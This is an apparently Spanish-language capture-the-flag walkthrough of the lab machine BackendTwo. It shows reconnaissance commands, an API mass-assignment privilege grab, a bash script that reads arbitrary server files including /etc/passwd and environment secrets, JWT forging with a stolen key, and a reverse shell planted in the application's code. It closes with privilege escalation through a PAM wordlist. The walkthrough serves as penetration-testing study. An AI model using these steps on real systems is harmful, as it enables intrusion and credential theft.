---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos

![scan 1](/assets/images/BackendTwo/scan1.png)

Adicional, esta vez analizaremos la dirección de los paquetes, con el comando

```s
ping -c 2 10.10.11.162 -R
```

![scan 2](/assets/images/BackendTwo/scan2.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.162
```

![nmap 1](/assets/images/BackendTwo/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.162 -oG allPorts
```

![nmap 2](/assets/images/BackendTwo/nmap2.png)

Logramos ver, que hay un application/json el cual puede significar que existen apis por detrás.
También vemos que se utiliza unicorn, el cual con una búsqueda rápida vemos que es un web server ASGI de Python.
Para ver exactamente la versión de Ubuntu que nos muestra el escaneo, solo tendremos que poner en el buscador: “OpenSSH 8.2p1 4ubuntu0.4 launchpad” y veremos que es un ubuntu Focal

Y con el extractPorts, extraemos la información relevante para nosotros.
extractPorts allPorts

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
nmap -sCV -p22,80 10.10.11.162 -oN targeted
```

Para seguir escaneando el servicio de tcp, utilizaremos la herramienta whatweb, que es como el wapalizer y sirve para analizar rápidamente las tecnologías que integran la aplicación.

```s
whatweb http://10.10.11.162
```
![Whatweb](/assets/images/BackendTwo/whatweb.png)

El siguiente escaneo, será con Fuzzing y usaremos la herramienta wfuzz, con una wordlist de directorios predeterminada de Kali.

``` s
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/wfuzz/webservices/ws-files.txt http://10.10.11.162
```

![Wfuzz 1](/assets/images/BackendTwo/wfuzz1.png)

Para hacer el Fuzz buscando subdominios como backend.htb, es:

```s
wfuzz -c -hc=404 -t 200 -w /usr/share/wordlists/wfuzz/webservices/ws-files.txt -H "Host: FUZZ.backendtwo.htb" http://backendtwo.htb
```

Wordlist recomendada por otros hackers:
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt

![Wfuzz 2](/assets/images/BackendTwo/wfuzz2.png)

Tenemos 2 rutas aclaradas con la segunda búsqueda, procederemos a ver la de api, esta nos muestra que existe un endpoint, al cual accederemos agregando a la ruta /api/v1 y ahora visualizamos que hay 2 usuarios para acceder

Ahora que accedimos, en admin nos encontramos que no estamos autenticados. Asi que lo dejaremos por el momento.

![Admin test](/assets/images/BackendTwo/admin_unauth.png)

En users, notamos que no ha podido encontrar algún usuario

![User test](/assets/images/BackendTwo/user_not)

Despues del primer test, vemos que podemos agregar una numeracion al final para listar la informacion de los usuarios.

![User test 1](/assets/images/BackendTwo/user_test1.png)

Para listar todos los posibles usuarios, lo que haremos, con un script

```s
for i in $(seq 1 20); do curl -s -X GET "http://10.10.11.162/api/v1/user/$i" | jq '.["email"]' | tr -d '"'; done | grep -v "null" > users
#jq Para el formato en jquery y ademas que muestre solo el email
#Para borrar las comillas
#seq 1-5 para hacer un secuenciador del 1 al 5
#grep -v "null" para que no muestre el estado null
#> users    Guarda el resultado en un archivo llamado users para la evidencia
```

![Script 1 answer](/assets/images/BackendTwo/script1.png)

Como los correos cuentan con un dominio, procederemos a agregarnos este en nuestro archivo de etc/hosts y continuar haciendo fuzzing, ahora con otra herramienta como go buster, que nos permite anadir el parametro de vhost para enumerar subdominios.

```s
gobuster vhost -u http://backendtwo.htb -w /usr/share/wfuzz/wordlist/webservices/subdomains-top1million-5000.txt -t 200
#-t 200 es para que vaya mas rapido con 200 hilos
```

Esta busqueda no nos encontro nada, asi que afirmamos que no se esta aplicando virtual hosting en la maquina. Procederemos a hacer otro test con wfuzz con diferentes parametros ahora

```s
wfuzz -c --hc=404,422 --hh=4 -t 200 -w /usr/share/wordlists/wfuzz/webservices/directory-list-2.3-medium.txt http://10.10.11.162/api/v1/user/FUZZ
#--hh=4 es la manera que usaremos para evitar las respuestas que contengan un Null
```
Ahora el problema que tenemos, es que sale un nuevo codigo de error, pero tambien notamos que al poner cualquier numero de 4 digitos y no existir, la respuesta de la peticion es un NULL, asi que podemos filtrar tambien que cuando se presente esto, no tome en cuenta esa respuesta porque aun asi el status es 200 y nos lo mostrara como respuesta de la busqueda.

Para la siguiente prueba, podemos hacer tambien la busqueda por medio del metodo POST, ocultando el codigo de estado 405 y eliminando los anteriores, para poder analizar lo que esta reportando la herrramienta.

```s
wfuzz -c --hc=405 -X POST -t 200 -w /usr/share/wordlists/wfuzz/webservices/directory-list-2.3-medium.txt http://10.10.11.162/api/v1/user/FUZZ
```

Esta busqueda nos muestra una seccion de login y signup, intentaremos ahora hacer una peticion con el metodo POST de la siguiente manera:

```s
curl -s -X POST "http://10.10.11.162/api/v1/user/signup" -H "Content-type: application/json" -d '{"email":"rebick@rebick.com", "password":"rebick123"}' | jq 
```

La maquina aparentemente nos responde correctamente con esta peticion, asi que procederemos a intentar hacer un login para obtener quizas una cookie de sesion.

```s
curl -s -X POST "http://10.10.11.162/api/v1/user/login" -d 'username=rebick@rebick.com&password=rebick123' | jq 
```

En el comando anterior, se pasa en el metodo POST la data con formato de respuesta web normal, no como el anterior que se pasaba en formato json.

![Access token](/assets/images/BackendTwo/access_token.png)

La respuesta nos da un Access token, el cual podemos descifrar ahora con `jwt.io`.

![Access token interpretado](/assets/images/BackendTwo/jwt1.png)

De este resultado podemos ver que en la parte del sub:12 es el identificador del usuario que enumerabamos en los subdominios anteriores. Y tambien nos muestra que no tenemos los permisos de super usuario, si tuvieramos la frase secreta podriamos generar un token que modifique esta respuesta.

Las siguientes pruebas que realizaremos, seran con Burpsuite para poder modificar las peticiones e integrar el webtoken.

En la configuracion, agregaremos una configuracion en el Match & Response para agregar el Access Token de la siguiente manera:

![Access token configurado](/assets/images/BackendTwo/bearer_conf.png)

En la siguiente captura, notamos que la configuracion anterior ha incorporado en la peticion el access token. Y podremos dejar que la peticion fluya.

![Access token integrado](/assets/images/BackendTwo/bearerIntegrated.png)

Gracias a lo anterior, podemos ver que ahora tenemos acceso al dashboard de configuracion y procederemos a buscar mas formas de acceder ahora.

![Access to web App](/assets/images/BackendTwo/webApp_access.png)

FastAPI es un framework para crear APIs para Python de manera sencilla, quizas podamos usarla para ir construyendo comandos para escribir o leer archivos en el servidor.

En las pruebas hechas, notamos que podemos cambiar la contrasena de los usuarios, pero el de admin no es posible, asi que buscaremos otra manera de hacerlo. Tampoco podemos aun leer archivos aunque se pasen en base64, la escritura tambien se ve que se tiene que ser administradores para poder hacerlo.

Ahora descubrios que existe una vulnerabilidad de Mass Asignament, al intentar modificar el profile, y agregar el campo de correo, se nos permite tambien cambiarlo asi que la siguiente prueba sera intentar asignarnos el superusuario a traves de este medio.

![Rebick Superuser](/assets/images/BackendTwo/rebick_su.png)

Procedemos a hacer la validacion de los cambios, con el siguiente comando

```s
curl -s -X GET 'http://10.10.11.162/api/v1/user/12' -H 'accept: application/json' | jq
```

![Curl validation](/assets/images/BackendTwo/curl_validation.png)

Ahora que podemos hacer cosas de administrador, procedemos a listar los directorios para recolectar informacion del servidor, ya que lopide en base64 usaremos el siguiente comando:

```s
echo -n /etc/passwd | base64
```

![/etc/passwd](/assets/images/BackendTwo/etc_passwd.png)

Ahora que tenemos acceso a la lectura y escritura, podremos crear un exploit o un script en bash para automatizar los requests de estas consultas, como el siguiente:

```bash
#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  exit 1
}

function helpPanel(){
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uso: ${endColour}"
  echo -e "\t${purpleColour}[+]${endColour}${grayColour} Nombre de archivo a leer${endColour}"
  echo -e "\t${purpleColour}[+]${endColour}${grayColour} Mostrar este panel de ayuda${endColour}"
  exit 1
}

function getFilename(){
  filename="$1"
  filename_base64="$(echo -n $filename | base64 -w 0)"
  
  curl -s -X GET "http://10.10.11.162/api/v1/admin/file/$filename_base64" -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU0NTc2NDE0LCJpYXQiOjE2NTM4ODUyMTQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiYWUwMWJjOTItMjc5Ny00NzVlLTk4NjctOWE5NzEwMjBkYmUxIn0.GT8BGpzeGVkJryDXpzn2LL-tMVNmKfk61lDnNPF9pF8' | jq -r '.file' | tr '\u000' '\n'
}

#Ctrl+c
trap ctrl_c INT

declare -i delimiter_counter=0; while getopts "f:h" arg; do
  case $arg in
    f) filename=$OPTARG && delimiter_counter+=1;;
    h) helpPanel;;
  esac
done

if [ $delimiter_counter -eq 1 ]; then
  getFilename $filename
else
  helpPanel
fi
```

![/etc/passwd](/assets/images/BackendTwo/etc_passwd.png)

Para que nos filtre solamente los usuarios, podemos usar el comando:

```s
sudo bash getFile.sh -f /etc/passwd | grep "sh$
```

![/etc/passwd](/assets/images/BackendTwo/etc_group.png)

![/etc/hosts](/assets/images/BackendTwo/etc_hosts.png)

Para reportar los puertos que estan abiertos:

![/proc/net/tcp](/assets/images/BackendTwo/proc.png)

Para saber si estamos virtualizando dentro de la maquina, podemos buscar en la ruta `/proc/net/fib_trie`, la cual expone las interfaces.

Otros lugares para buscar, son `/proc/self/cmdline`, `/proc/self/stat`, en `/proc/self/environ` encontraremos la llave de la API y quizas podremos crearnos nuestros propios jwt.

Haciendo una exploracion ya dentro de la aplicacion, vemos que la API_KEY que sacamos, es la llave para crear los jwt, y ahora si podemos crear un token que contenga el debug que hacia falta para poder escribir.

Utilizaremos Python para que nos pueda interpretar los tokens, al hacerlo me presente con problemas en el decode, tuve que desinstalar jwt e instalar PyJwt.

![Token decode](/assets/images/BackendTwo/py_toke_decode.png)

Token con debug agregado:

![New Token](/assets/images/BackendTwo/py_new_token.png)

Ahora procederemos a hacer una prueba para escribir un archivo en el servidor

![Writting files](/assets/images/BackendTwo/writing_files.png)

Ahora escribiremos una reverse shell, la cual tomara en cuenta la aplicacion que ya existe de user.py. Con <a href="https://gchq.github.io/CyberChef/">Ciberchef</a> tendremos que reemplazar la comilla simple por \'\\'', la doble por \\", \n por \\\\n, \n por \\n.

![Modification to usr.py](/assets/images/BackendTwo/modification_usrPY.png)

![Modification with CyberChef](/assets/images/BackendTwo/cyberchef.png)

Solamente tendremos que copiar el codigo que anteriormente modificamos para que ejecute la reverse shell y despues con el curl, integrarlo para que escriba en la ruta que queremos.


![Payload succes upload](/assets/images/BackendTwo/payload_success.png)

![Payload verification](/assets/images/BackendTwo/payload_evidence.png)

Nos ponemos en escucha en el puerto 4444 y esperamos la conexion de vuelta

![Reverse shell working](/assets/images/BackendTwo/reverse_shell_success.png)

Para que nuestra nueva terminal trabaje normal, tendremos que ejecutar en ella:

```s
script /dev/null -c bash
```

Y desde nuestra maquina un:

```s
stty raw -echo;fg
```

Escalada de privilegios
Para poder subir los privilegios, podemos dar un cat auth_log y ahi mismo veremos que hay una contrasena ingresada, eso pasa en todos lados cuando intentas meter la contrasena en el lugar del usuario, probaremos a ver si esta es del usuario htb

![auth.log](/assets/images/BackendTwo/auth.log.png)

Al intentar logearnos como root con un simple sudo, nos abre una consola de PAM para poder ingresar la contrasena, para ingresar a sus configuraciones podemos ingresar en `/etc/pam.d` y despues para ver si encontramos en alguna ruta el archivo con el que compara:

```s
find \-name pam_wordle.so 2>/dev/null
```

Encontramos el archivo en la ruta /usr/lib/x86_64-linux-gnu/security/pam_wordle.so

```s
strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so | less
```

Aqui encontramos un archivo con una lista de palabras que podrian ser con las que se compara el programa, en /opt/.words, el cual nos copiaremos para poder grepear las lineas y encontrar la palabra correcta, ya que esto es como jugar al ahorcado.

```s
cat dictionary.txt | grep "s" | grep -vE "u|m|a|k" | grep "o"
```

La palabra final en este caso, fue flock.

![auth.log](/assets/images/BackendTwo/ahorcado.png)

![Powned](/assets/images/BackendTwo/pwned.png)